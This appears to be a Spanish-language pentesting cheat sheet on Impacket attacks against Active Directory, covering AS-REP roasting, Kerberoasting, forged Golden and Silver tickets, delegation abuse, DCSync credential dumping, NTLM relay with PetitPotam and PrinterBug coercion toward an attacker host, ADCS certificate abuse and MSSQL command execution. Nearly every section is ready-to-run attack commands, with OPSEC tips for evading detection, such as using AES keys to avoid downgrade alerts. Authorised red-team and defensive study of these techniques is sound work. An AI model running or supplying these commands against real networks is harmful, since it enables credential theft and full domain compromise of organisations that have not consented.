---
title: "Impacket — Ataques Kerberos & Credenciales"
description: "Ataques avanzados con Impacket: Kerberoasting, AS-REP Roasting, Golden/Silver Tickets, RBCD, secretsdump, relay attacks y ADCS."
sidebar:
  order: 4
  label: "Impacket — Ataques & Credenciales"
---

> <img src="https://pypi-camo.freetls.fastly.net/652cfe66f331e651740e9712d2b41136e85c4208/68747470733a2f2f6769746875622e636f6d2f757365722d6174746163686d656e74732f6173736574732f31346165643730302d306336652d343836352d616335332d363836623931383734663530" alt="Impacket" style="height: 40px; margin-bottom: 8px;" />
> 
> Cadenas de ataque avanzadas con Impacket: desde AS-REP Roasting hasta Golden Tickets, DCSync, relay attacks y explotación ADCS. Cada técnica documentada con comandos reales, requisitos y perfil OPSEC.
> 
> **Repo Oficial:** [fortra/impacket](https://github.com/fortra/impacket)

---

## AS-REP Roasting — GetNPUsers.py

Objetivo: cuentas con `DONT_REQ_PREAUTH`.

```bash
# Sin credenciales (con lista de usuarios)
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.0.1.51

# Con credenciales válidas (enumera automáticamente)
GetNPUsers.py corp.local/user:password -request -format hashcat -outputfile asrep.txt

# Crack — hashcat modo 18200
hashcat -m 18200 asrep.txt wordlist.txt
```

> **Nota:** Se puede ejecutar sin credenciales válidas si se tiene lista de usernames.

---

## Kerberoasting — GetUserSPNs.py

Objetivo: cuentas de servicio con SPNs registrados. Requiere credenciales de cualquier usuario del dominio.

```bash
# Enumerar SPNs y solicitar tickets TGS
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.1.51 -request -outputfile kerberoast.txt

# Con hash NTLM
GetUserSPNs.py corp.local/user -hashes :<NThash> -dc-ip 10.0.1.51 -request

# Crack
hashcat -m 13100 kerberoast.txt wordlist.txt    # RC4 (etype 23)
hashcat -m 19700 kerberoast.txt wordlist.txt    # AES (etype 17/18)
```

---

## Silver Ticket — ticketer.py

Forja un Service Ticket (TGS) para un servicio específico. Requiere hash NTLM o AES key de la cuenta del servicio + Domain SID.

```bash
# Forjar Silver Ticket para CIFS
ticketer.py -nthash <SERVICE_NTLM_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/target.corp.local \
  Administrator

# Usar el ticket
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@target.corp.local -k -no-pass
```

No contacta al DC. Limitado al servicio objetivo.

---

## Golden Ticket — ticketer.py

Forja un TGT completo. Requiere hash NTLM o AES key de la cuenta `krbtgt` + Domain SID.

```bash
# Con NTLM
ticketer.py -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  Administrator

# Con AES key (más sigiloso — evita alertas de encryption downgrade)
ticketer.py -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  Administrator

# Usar para DCSync
export KRB5CCNAME=Administrator.ccache
secretsdump.py corp.local/Administrator@dc01.corp.local -k -no-pass
```

> **Precaución:** No genera AS-REQ en logs del DC — señal de detección principal. Usar AES keys para evitar alertas de encryption downgrade.

---

## Diamond Ticket (Concepto avanzado)

Evolución del Golden Ticket:
1. Solicita un TGT legítimo del DC (genera AS-REQ normal en los logs)
2. Descifra el TGT con la clave KRBTGT
3. Modifica el PAC para incluir privilegios elevados
4. Re-cifra y lo usa

Bypassea la detección por "ausencia de AS-REQ" que captura Golden Tickets convencionales. Tooling principal: Rubeus (`diamond` command).

---

## Sapphire Ticket

La técnica de forjado Kerberos más sigilosa conocida:
1. Obtiene un TGT legítimo
2. Usa S4U2Self + User-to-User (U2U) para obtener un PAC real de un usuario con altos privilegios
3. Inyecta ese PAC genuino en el ticket

El PAC es genuino — pertenecía a un usuario real. Sin discrepancia entre privilegios del ticket y membresías reales.

---

## S4U — Abuso de delegación — getST.py

```bash
# Impersonar Administrator en servicio objetivo
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.1.51 \
  corp.local/compromised_svc$:password

# Con hash NTLM
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -hashes :<NThash> \
  corp.local/compromised_svc$

# Usar ticket resultante
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
wmiexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

---

## RBCD — Resource-Based Constrained Delegation

Prerequisitos: acceso de escritura (`GenericAll`, `GenericWrite`, `WriteDacl`) sobre un objeto computer.

```bash
# Paso 1: Crear cuenta de computer
addcomputer.py -computer-name 'EVILPC$' \
  -computer-pass 'Password123!' \
  -dc-ip 10.0.1.51 \
  corp.local/user:password

# Paso 2: Configurar RBCD
rbcd.py -delegate-from 'EVILPC$' \
  -delegate-to 'TARGET$' \
  -action write \
  -dc-ip 10.0.1.51 \
  corp.local/user:password

# Paso 3: Obtener service ticket impersonando Administrator
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.1.51 \
  corp.local/EVILPC$:'Password123!'

# Paso 4: Usar el ticket
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
wmiexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

---

## Unconstrained Delegation

Objetivo: máquinas con `TRUSTED_FOR_DELEGATION`.

```bash
# Verificar Spooler Service en DC
rpcdump.py corp.local/user:password@dc01.corp.local | grep MS-RPRN

# Trigger PrinterBug
printerbug.py corp.local/user:password@dc01.corp.local attacker_ip
```

Flujo: Comprometer servidor con unconstrained delegation → Coercionar DC (PrinterBug/PetitPotam) → Capturar TGT del DC → DCSync.

---

## secretsdump.py — Extracción de credenciales

### DCSync (DRSUAPI)

Requiere permisos "Replicating Directory Changes" + "Replicating Directory Changes All".

```bash
# DCSync completo
secretsdump.py corp.local/admin:password@dc01.corp.local

# Usuario específico
secretsdump.py corp.local/admin:password@dc01.corp.local -just-dc-user krbtgt

# Solo NTLM hashes
secretsdump.py corp.local/admin:password@dc01.corp.local -just-dc-ntlm

# Con hash NTLM
secretsdump.py -hashes :<NThash> corp.local/admin@dc01.corp.local

# Con ticket Kerberos
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass corp.local/admin@dc01.corp.local

# Con historial de contraseñas
secretsdump.py corp.local/admin:password@dc01.corp.local -history
```

### VSS Shadow Copy

```bash
# Forzar método VSS
secretsdump.py corp.local/admin:password@dc01.corp.local -use-vss

# Especificar método de ejecución
secretsdump.py corp.local/admin:password@dc01.corp.local -use-vss -exec-method wmiexec
```

### Extracción offline

```bash
# Desde hives locales
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Desde NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Formato de salida

```
usuario:RID:LMhash:NThash:::
# Ejemplo:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Archivos generados con `-outputfile dump`:

| Archivo | Contenido |
|---------|----------|
| `dump.sam` | Hashes SAM locales |
| `dump.ntds` | Hashes NTDS.dit del dominio |
| `dump.secrets` | LSA secrets (creds cacheadas, passwords de service accounts) |
| `dump.ntds.kerberos` | Claves Kerberos (AES256, AES128, DES) |
| `dump.ntds.cleartext` | Contraseñas en claro (si cifrado reversible habilitado) |

Flags útiles:

| Flag | Propósito |
|------|-----------|
| `-outputfile <base>` | Guardar con extensiones automáticas |
| `-just-dc-ntlm` | Solo hashes NTLM |
| `-just-dc` | Solo datos NTDS.dit |
| `-just-dc-user <user>` | Hash de usuario específico |
| `-history` | Incluir historial de contraseñas |

Cracking:

```bash
hashcat -m 1000 dump.ntds wordlist.txt
cat dump.ntds | cut -d: -f1,4              # Extraer usernames y NT hashes
grep "31d6cfe0d16ae931b73c59d7e0c089c0" dump.ntds   # Contraseñas vacías
```

---

## Relay attacks — ntlmrelayx.py

Métodos de coerción de autenticación:

| Método | Protocolo | Descripción |
|--------|-----------|-------------|
| PetitPotam | MS-EFSRPC | Más fiable, funciona contra DCs |
| PrinterBug | MS-RPRN | Requiere Print Spooler activo |
| mitm6 | IPv6 DNS | DNS poisoning para WPAD/proxy |
| Responder | LLMNR/NBT-NS | Poisoning de resolución de nombres |

### SMB Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"   # Comando específico
ntlmrelayx.py -tf targets.txt -smb2support -i             # Shell interactiva
```

> **Requisito:** SMB Signing debe estar deshabilitado en el objetivo.

### LDAP Relay

```bash
# Crear computer account + RBCD
ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access

# Shadow Credentials
ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials

# Escalar usuario vía ACL
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker_user
```

### ADCS Relay (ESC8)

```bash
# 1. Iniciar ntlmrelayx apuntando al Web Enrollment
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. Coercionar al DC
python3 PetitPotam.py attacker_ip dc01.corp.local

# 3. Usar certificado para TGT
gettgtpkinit.py -cert-pfx dc.pfx -dc-ip 10.0.1.51 corp.local/DC$ dc.ccache

# 4. DCSync
export KRB5CCNAME=dc.ccache
secretsdump.py -k -no-pass corp.local/DC$@dc01.corp.local
```

---

## ADCS — Matriz de vulnerabilidades

| ESC | Nombre | Problema | Impacto |
|-----|--------|----------|---------|
| ESC1 | SAN Impersonation | Template permite SAN + low-priv enrollment + Client Auth EKU | Impersonación de Domain Admin |
| ESC2 | Any Purpose EKU | Template con EKU "Any Purpose" o sin EKU | Escalada flexible |
| ESC3 | Enrollment Agent | Template con EKU "Certificate Request Agent" | Solicitar certs como otros usuarios |
| ESC4 | Template ACL Abuse | Low-priv user puede modificar el template | Modificar template → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | Flag del CA permite SAN en cualquier solicitud | Cualquier template → ESC1 |
| ESC7 | CA Access Control | Permisos "Manage CA" abusados | Aprobar solicitudes pendientes |
| ESC8 | NTLM Relay a Web Enrollment | Endpoint HTTP acepta NTLM sin EPA | Relay → Cert → Domain compromise |

Workflow con Certipy:

```bash
certipy find -u user@corp.local -p password -dc-ip 10.0.1.51 -vulnerable
certipy req -u user@corp.local -p password -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.1.51
```

Integración Impacket + ADCS: ntlmrelayx.py para ESC8, resultados alimentan workflows Impacket (Certificado → gettgtpkinit.py → TGT → secretsdump.py -k).

---

## Explotación MSSQL — mssqlclient.py

```bash
# Autenticación SQL
mssqlclient.py user:password@mssql.corp.local

# Autenticación Windows
mssqlclient.py corp.local/user:password@mssql.corp.local -windows-auth

# Pass-the-Hash
mssqlclient.py corp.local/user@mssql.corp.local -windows-auth -hashes :<NThash>
```

### xp_cmdshell

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell dir C:\Users
```

### Linked Servers

```sql
-- Enumerar linked servers
SELECT * FROM sys.servers;

-- Ejecutar en linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer];

-- Encadenar múltiples links
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SecondLink]') AT [FirstLink];
```

### Coerción NTLM vía MSSQL

```
SQL> xp_dirtree \\attacker_ip\share
```

Fuerza al servicio MSSQL a autenticarse contra el atacante — capturar con Responder/smbserver.py o relay con ntlmrelayx.

---

## Troubleshooting

| Error | Causa | Solución |
|-------|-------|----------|
| `KRB_AP_ERR_SKEW` | Reloj difiere >5 min del DC | `sudo rdate -n <DC_IP>` |
| `STATUS_ACCESS_DENIED` | Permisos insuficientes | Verificar grupo admin local / ACLs |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN no encontrado | Usar FQDN en lugar de IP |
| `STATUS_LOGON_FAILURE` | Credenciales incorrectas | Verificar usuario/contraseña |
| `STATUS_ACCOUNT_DISABLED` | Cuenta deshabilitada | Verificar estado en AD |
| `STATUS_ACCOUNT_LOCKED_OUT` | Demasiados intentos | Esperar o desbloquear |
| Connection Refused | Puerto cerrado/firewall | `nc -zv <IP> 445` |

> **Tip:** Añadir `-debug` a cualquier comando para output detallado. Usar `describeTicket.py ticket.ccache` para verificar tickets.

---

## OPSEC — Matriz de detección

| Event ID | Fuente | Detecta |
|----------|--------|---------|
| 4624 | Security | Eventos de logon (Type 3 = network) |
| 4662 | Security | Acceso a Directory Service (DCSync) |
| 4768 | Security | Pre-auth Kerberos (AS-REP Roasting) |
| 4769 | Security | Solicitudes TGS (Kerberoasting) |
| 4698 | Security | Creación de tarea programada (atexec) |
| 4741 | Security | Creación de cuenta computer (RBCD) |
| 5136 | Security | Modificación de objeto AD (RBCD, Shadow Creds) |
| 7045 | System | Instalación de servicio (psexec, smbexec) |
| 4886/4887 | AD CS | Solicitud/emisión de certificado |

### Nivel de ruido

| Herramienta | Ruido | Indicador clave |
|-------------|-------|-----------------|
| `psexec.py` | [RUIDOSO] | Event 7045, binario en disco |
| `smbexec.py` | [ALTO] | Servicio temporal, .bat en disco |
| `wmiexec.py` | [MODERADO] | wmiprvse.exe → cmd.exe |
| `dcomexec.py` | [SIGILOSO] | Tráfico DCOM/RPC |
| `secretsdump.py` (DCSync) | [ALTO] | Event 4662 desde non-DC |
| `GetNPUsers.py` | [BAJO] | Event 4768 anormal |
| `ticketer.py` (Golden) | [BAJO*] | Sin AS-REQ (detección por ausencia) |

---

## Cheatsheets relacionados

- [AD Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — Kerberoasting con Rubeus, ACL abuse, DCSync con Mimikatz
- [Impacket — Guía Operativa](/metodologias/active-directory/impacket-guide/) — Instalación, autenticación, inventario, ejecución remota
- [Attacking Enterprise Networks](/metodologias/active-directory/attacking-enterprise-networks/) — Flujo end-to-end
